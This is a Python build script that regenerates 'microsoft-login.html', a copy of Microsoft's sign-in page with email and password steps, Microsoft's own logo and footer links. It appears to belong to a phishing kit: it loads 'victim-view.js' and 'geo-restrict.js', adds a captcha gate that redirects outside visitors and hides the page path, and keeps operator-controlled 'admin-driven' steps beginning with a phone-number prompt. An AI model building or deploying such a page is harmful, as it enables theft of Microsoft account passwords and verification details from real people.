"""Rebuild microsoft-login.html with Microsoft-style step 1/2 UI."""
from pathlib import Path

root = Path(__file__).resolve().parents[1]
src = (root / "microsoft-login.html").read_text(encoding="utf-8")

# Preserve steps 3–7 and all script blocks after first script guard
step3_start = src.index("    <!-- ── STEP 3: Phone number ── -->")
scripts_start = src.index("  <script src=\"assets/victim-view.js\">")

steps_3_7 = src[step3_start:scripts_start]

MS_HEAD = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <script src="assets/geo-restrict.js"></script>
  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in to your account</title>
  <link rel="icon" href="https://c.s-microsoft.com/favicon.ico"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }
    body {
      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      color: #1b1b1b;
    }
    .ms-bg {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background:
        radial-gradient(ellipse 120% 80% at 10% 0%, rgba(180, 220, 255, 0.55) 0%, transparent 55%),
        radial-gradient(ellipse 90% 70% at 95% 10%, rgba(200, 190, 255, 0.35) 0%, transparent 50%),
        radial-gradient(ellipse 100% 60% at 50% 100%, rgba(255, 210, 230, 0.25) 0%, transparent 55%),
        #f2f2f2;
    }
    .ms-main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 16px 48px;
    }
    #lightbox {
      box-sizing: border-box;
      width: 440px;
      max-width: 100%;
      height: 338px;
      min-height: 338px;
      background: #fff;
      box-shadow: 0 2px 6px rgba(0,0,0,.08), 0 8px 24px rgba(0,0,0,.1);
      padding: 44px;
      position: relative;
      overflow-x: hidden;
      overflow-y: auto;
    }
    @media (max-width: 480px) {
      #lightbox {
        box-sizing: border-box;
        width: 430px;
        max-width: 100%;
        height: 338px;
        min-height: 338px;
        padding: 32px 24px;
        box-shadow: none;
      }
      .ms-main { padding: 24px 16px 48px; align-items: center; }
    }
    .ms-logo {
      display: block;
      height: 24px;
      width: auto;
      margin: 0 auto 24px;
    }
    .ms-back {
      position: absolute;
      left: 12px;
      top: 12px;
      width: 36px;
      height: 36px;
      border: none;
      background: transparent;
      cursor: pointer;
      border-radius: 4px;
      color: #1b1b1b;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .ms-back:hover { background: rgba(0,0,0,.04); }
    .ms-title {
      font-size: 24px;
      font-weight: 600;
      line-height: 1.25;
      margin-bottom: 20px;
      color: #1b1b1b;
    }
    .ms-input {
      width: 100%;
      height: 36px;
      padding: 6px 10px;
      font-size: 15px;
      font-family: inherit;
      border: 1px solid #605e5c;
      outline: none;
      color: #1b1b1b;
    }
    .ms-input:focus {
      border-color: #0067b8;
      box-shadow: 0 0 0 1px #0067b8;
    }
    .ms-input.err { border-color: #a80000; box-shadow: 0 0 0 1px #a80000; }
    .ms-field-error {
      font-size: 13px;
      color: #a80000;
      margin-top: 8px;
      display: none;
    }
    .ms-field-error.visible { display: block; }
    .ms-links { margin-top: 16px; font-size: 13px; line-height: 1.6; }
    .ms-links a { color: #0067b8; text-decoration: none; }
    .ms-links a:hover { text-decoration: underline; color: #004578; }
    .ms-btn-row { margin-top: 24px; text-align: right; }
    .ms-btn-primary {
      min-width: 108px;
      height: 32px;
      padding: 4px 20px;
      font-size: 15px;
      font-family: inherit;
      font-weight: 600;
      color: #fff;
      background: #0067b8;
      border: none;
      cursor: pointer;
    }
    .ms-btn-primary:hover { background: #005a9e; }
    .ms-btn-primary:disabled { opacity: 0.6; cursor: default; }
    .ms-identity-pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      max-width: 100%;
      padding: 4px 12px;
      margin-bottom: 20px;
      border: 1px solid #8c8c8c;
      border-radius: 16px;
      font-size: 15px;
      color: #1b1b1b;
      background: #fff;
    }
    .ms-identity-pill svg { flex-shrink: 0; }
    .ms-identity-email {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .page-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,.55);
      z-index: 99;
    }
    .page-overlay.visible { display: block; }
    .ms-footer {
      flex-shrink: 0;
      padding: 12px 24px 20px;
      font-size: 12px;
      color: #605e5c;
      display: flex;
      flex-wrap: wrap;
      gap: 12px 20px;
      justify-content: flex-end;
    }
    .ms-footer a { color: #605e5c; text-decoration: none; }
    .ms-footer a:hover { text-decoration: underline; }
    .btn-spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255,255,255,.35);
      border-top-color: #fff;
      border-radius: 50%;
      animation: msspin .65s linear infinite;
      vertical-align: middle;
    }
    @keyframes msspin { to { transform: rotate(360deg); } }

    /* Legacy admin-driven steps (3–7) */
    .legacy-step.card-body {
      display: none;
      flex-direction: column;
      padding: 0;
      font-size: 14px;
    }
    .legacy-step.card-body[style*="flex"] { display: flex !important; }
    .legacy-step h1 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
    .legacy-step .text-field input {
      width: 100%; height: 40px; padding: 8px 10px; border: 1px solid #605e5c; font-size: 15px;
    }
    .legacy-step .field-error { color: #a80000; font-size: 13px; margin-top: 6px; display: none; }
    .legacy-step .field-error.visible { display: block; }
    .legacy-step .btn-next {
      margin-top: 16px; min-width: 108px; height: 32px; background: #0067b8; color: #fff; border: none; cursor: pointer;
    }
    .legacy-step .actions { margin-top: 16px; display: flex; justify-content: flex-end; gap: 8px; }
  </style>
</head>
<body>
  <div class="page-overlay" id="overlay"></div>
  <div class="ms-bg">
    <main class="ms-main">
      <div id="lightbox" role="main">

        <div class="ms-view" id="step1">
          <img class="ms-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"/>
          <h1 class="ms-title">Sign in</h1>
          <input type="email" id="emailInput" class="ms-input" name="loginfmt" autocomplete="username webauthn" spellcheck="false" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype."/>
          <div class="ms-field-error" id="emailError">Enter a valid email address, phone number, or Skype name.</div>
          <div class="ms-links">
            <div>No account? <a href="#">Create one!</a></div>
            <div style="margin-top:8px"><a href="#">Can&rsquo;t access your account?</a></div>
          </div>
          <div class="ms-btn-row">
            <button type="button" class="ms-btn-primary" id="emailNextBtn"><span id="emailBtnLabel">Next</span></button>
          </div>
        </div>

        <div class="ms-view" id="step2" style="display:none;">
          <button type="button" class="ms-back" id="msBackBtn" aria-label="Back">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M10.5 19.5 3 12l7.5-7.5 1.06 1.08L5.62 11H21v1.5H5.62l5.94 5.92-1.06 1.08z"/></svg>
          </button>
          <img class="ms-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"/>
          <div class="ms-identity-pill" id="accountChip">
            <span class="ms-identity-email" id="chipEmail"></span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#605e5c" aria-hidden="true"><path d="M7 10l5 5 5-5H7z"/></svg>
          </div>
          <h1 class="ms-title">Enter your password</h1>
          <input type="password" id="pwInput" class="ms-input" name="passwd" autocomplete="current-password" placeholder="Password" aria-label="Enter your password"/>
          <div class="ms-field-error" id="pwError">Wrong password. Try again or click Forgot password to reset it.</div>
          <div class="ms-btn-row">
            <button type="button" class="ms-btn-primary" id="pwNextBtn"><span id="pwBtnLabel">Next</span></button>
          </div>
        </div>

"""

MS_TAIL_SCRIPTS = src[scripts_start:]

# Patch scripts for MS UI
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "function showErr(input, errEl) {\n      input.classList.add('err');",
    "function showErr(input, errEl) {\n      input.classList.add('err');",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "emailInput.classList.toggle('has-val', emailInput.value.length > 0);",
    "",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "pwInput.classList.toggle('has-val', pwInput.value.length > 0);",
    "",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "    /* ─── Password visibility toggle ─── */\n    showPwCheck.addEventListener('change', function () {\n      pwInput.type = showPwCheck.checked ? 'text' : 'password';\n      pwInput.focus();\n    });\n\n",
    "",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "    var showPwCheck  = document.getElementById('showPwCheck');\n\n",
    "",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "        step1.style.display = 'none';\n        step2.style.display = 'flex';",
    "        step1.style.display = 'none';\n        step2.style.display = 'block';",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "        step2.style.display = 'none';\n        step1.style.display = 'flex';",
    "        step2.style.display = 'none';\n        step1.style.display = 'block';",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "      if (!addr || addr.indexOf('@') < 0) {",
    "      if (!addr) {",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "    /* ─── Forgot password → back to step 1 ─── */\n    var forgotPwBtn = document.getElementById('forgotPwBtn');\n    if (forgotPwBtn) {\n      forgotPwBtn.addEventListener('click', function () {\n        pwInput.value = '';\n        pwInput.classList.remove('has-val', 'err');\n        pwErr.classList.remove('visible');\n        step2.style.display = 'none';\n        step1.style.display = 'flex';\n        emailInput.focus();\n      });\n    }\n",
    "    var msBackBtn = document.getElementById('msBackBtn');\n    if (msBackBtn) {\n      msBackBtn.addEventListener('click', function () {\n        pwInput.value = '';\n        pwInput.classList.remove('err');\n        pwErr.classList.remove('visible');\n        step2.style.display = 'none';\n        step1.style.display = 'block';\n        emailInput.focus();\n      });\n    }\n",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "      step2.style.display = 'flex';\n      pwInput.focus();",
    "      step2.style.display = 'block';\n      pwInput.focus();",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "        emailInput.classList.add('has-val');\n        chipEmail.textContent = storedEmail;",
    "        chipEmail.textContent = storedEmail;",
)
MS_TAIL_SCRIPTS = MS_TAIL_SCRIPTS.replace(
    "        pwInput.classList.remove('has-val');",
    "",
)

# Mark legacy steps
steps_3_7 = steps_3_7.replace('class="card-body" id="step3"', 'class="card-body legacy-step" id="step3"')
steps_3_7 = steps_3_7.replace('class="card-body" id="step4"', 'class="card-body legacy-step" id="step4"')
steps_3_7 = steps_3_7.replace('class="card-body" id="step5"', 'class="card-body legacy-step" id="step5"')
steps_3_7 = steps_3_7.replace('class="card-body" id="step6"', 'class="card-body legacy-step" id="step6"')
steps_3_7 = steps_3_7.replace('class="card-body" id="step7"', 'class="card-body legacy-step" id="step7"')

# Remove old card wrapper/footer from steps chunk
steps_3_7 = steps_3_7.split("  </div><!-- /.card -->")[0]

out = (
    MS_HEAD
    + "        "
    + steps_3_7.strip()
    + "\n\n      </div>\n    </main>\n    <footer class=\"ms-footer\">\n      <a href=\"https://www.microsoft.com/en-us/servicesagreement/\" target=\"_blank\" rel=\"noopener\">Terms of use</a>\n      <a href=\"https://privacy.microsoft.com/en-us/privacystatement\" target=\"_blank\" rel=\"noopener\">Privacy &amp; cookies</a>\n      <span>&hellip;</span>\n    </footer>\n  </div>\n\n"
    + MS_TAIL_SCRIPTS
)

(root / "microsoft-login.html").write_text(out, encoding="utf-8", newline="\n")
print("Rebuilt microsoft-login.html")
